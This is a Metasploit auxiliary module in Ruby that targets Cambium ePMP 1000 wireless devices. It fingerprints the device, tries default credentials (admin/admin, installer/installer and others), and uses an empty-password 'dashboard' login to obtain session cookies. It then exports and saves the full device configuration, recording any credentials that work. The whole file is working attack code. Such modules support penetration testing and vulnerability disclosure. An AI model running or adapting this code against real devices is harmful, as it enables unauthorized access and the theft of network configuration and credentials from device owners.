##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name'        => 'Cambium ePMP 1000 Dump Device Config',
      'Description' => %{
          This module dumps Cambium ePMP 1000 device configuration file. An ePMP 1000 box has four (4) login accounts - admin/admin, installer/installer, home/home, and readonly/readonly. This module requires any one of the following login credentials - admin / installer / home - to dump device configuration file.
      },
      'References' =>
        [
          ['URL', 'http://ipositivesecurity.com/2015/11/28/cambium-epmp-1000-multiple-vulnerabilities/']
        ],
      'Author' =>
        [
          'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
        ],
      'License' => MSF_LICENSE,
      'DefaultOptions' => { 'VERBOSE' => true })
    )

    register_options(
      [
        Opt::RPORT(80),	# Application may run on a different port too. Change port accordingly.
        OptString.new('USERNAME', [true, 'A specific username to authenticate as', 'installer']),
        OptString.new('PASSWORD', [true, 'A specific password to authenticate with', 'installer'])
      ], self.class
    )
  end

  def run_host(ip)
    unless is_app_epmp1000?
      return
    end

    each_user_pass do |user, pass|
      do_login(user, pass)
    end
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      last_attempted_at: Time.now,
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  #
  # Check if App is Cambium ePMP 1000
  #

  def is_app_epmp1000?
    begin
      res = send_request_cgi(
        {
          'uri'       => '/',
          'method'    => 'GET'
        }
      )

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
      print_error("#{rhost}:#{rport} - HTTP Connection Failed...")
      return false
    end

    good_response = (
      res &&
      res.code == 200 &&
      res.headers['Server'] &&
      (res.headers['Server'].include?('Cambium HTTP Server') || res.body.include?('cambiumnetworks.com'))
    )

    if good_response
      get_epmp_ver = res.body.match(/"sw_version">([^<]*)/)
      if !get_epmp_ver.nil?
        epmp_ver = get_epmp_ver[1]
        if !epmp_ver.nil?
          print_good("#{rhost}:#{rport} - Running Cambium ePMP 1000 version #{epmp_ver}...")
          return true
        else
          print_good("#{rhost}:#{rport} - Running Cambium ePMP 1000...")
          return true
        end
      end
    else
      print_error("#{rhost}:#{rport} - Application does not appear to be Cambium ePMP 1000. Module will not continue.")
      return false
    end
  end

  #
  # Login and dump config file
  #

  def do_login(user, pass)
    print_status("#{rhost}:#{rport} - Attempting to login...")
    begin
      res = send_request_cgi(
        {
          'uri' => '/cgi-bin/luci',
          'method' => 'POST',
          'headers' => {
            'X-Requested-With' => 'XMLHttpRequest',
            'Accept' => 'application/json, text/javascript, */*; q=0.01'
          },
          'vars_post' =>
            {
              'username' => 'dashboard',
              'password' => ''
            }
        }
      )

      good_response = (
        res &&
        res.code == 200 &&
        res.headers.include?('Set-Cookie') &&
        res.headers['Set-Cookie'].include?('sysauth')
      )

      if good_response
        sysauth_value = res.headers['Set-Cookie'].match(/((.*)[$ ])/)

        cookie1 = "#{sysauth_value}; " + "globalParams=%7B%22dashboard%22%3A%7B%22refresh_rate%22%3A%225%22%7D%2C%22#{user}%22%3A%7B%22refresh_rate%22%3A%225%22%7D%7D"

        res = send_request_cgi(
          {
            'uri' => '/cgi-bin/luci',
            'method' => 'POST',
            'cookie' => cookie1,
            'headers' => {
              'X-Requested-With' => 'XMLHttpRequest',
              'Accept' => 'application/json, text/javascript, */*; q=0.01',
              'Connection' => 'close'
            },
            'vars_post' =>
              {
                'username' => user,
                'password' => pass
              }
          }
        )
      end

      good_response = (
        res &&
        res.code == 200 &&
        res.headers.include?('Set-Cookie') &&
        res.headers['Set-Cookie'].include?('stok=')
      )

      if good_response
        print_good("SUCCESSFUL LOGIN - #{rhost}:#{rport} - #{user.inspect}:#{pass.inspect}")

        report_cred(
          ip: rhost,
          port: rport,
          service_name: 'Cambium ePMP 1000',
          user: user,
          password: pass
        )

        get_stok = res.headers['Set-Cookie'].match(/stok=(.*)/)
        if !get_stok.nil?
          stok_value = get_stok[1]
          sysauth_value = res.headers['Set-Cookie'].match(/((.*)[$ ])/)

          cookie2 = "#{sysauth_value}; " + "globalParams=%7B%22dashboard%22%3A%7B%22refresh_rate%22%3A%225%22%7D%2C%22#{user}%22%3A%7B%22refresh_rate%22%3A%225%22%7D%7D; userType=Installer; usernameType=installer; stok=" + "#{stok_value}"

          config_uri = '/cgi-bin/luci/;stok=' + "#{stok_value}" + '/admin/config_export?opts=json'

          res = send_request_cgi(
            {
              'method' => 'GET',
              'uri' => config_uri,
              'cookie' => cookie2,
              'headers' => {
                'Accept' => '*/*',
                'Accept-Language' => 'en-US,en;q=0.5',
                'Accept-Encoding' => 'gzip, deflate',
                'X-Requested-With' => 'XMLHttpRequest',
                'ctype' => 'application/x-www-form-urlencoded; charset=UTF-8',
                'Connection' => 'close'
              }
            }, 25
          )

          if res && res.code == 200 && res.body =~ /device_props/
            vprint_status('++++++++++++++++++++++++++++++++++++++')
            vprint_status("#{rhost}:#{rport} - dumping configuration")
            vprint_status('++++++++++++++++++++++++++++++++++++++')
            print_good("#{rhost}:#{rport} - File retrieved successfully!")

            path = store_loot('ePMP_config', 'text/plain', rhost, res.body, 'Cambium ePMP 1000 device config')
            print_status("#{rhost}:#{rport} - File saved in: #{path}")
          else
            print_error("#{rhost}:#{rport} - Failed to retrieve configuration")
            return
          end

          # Extract ePMP version
          res = send_request_cgi(
            {
              'uri' => '/',
              'method' => 'GET'
            }
          )

          epmp_ver = res.body.match(/"sw_version">([^<]*)/)[1]

          report_cred(
            ip: rhost,
            port: rport,
            service_name: "Cambium ePMP 1000 v#{epmp_ver}",
            user: user,
            password: pass
          )
        end
      else
        print_error("FAILED LOGIN - #{rhost}:#{rport} - #{user.inspect}:#{pass.inspect}")
      end
    end
  end
end
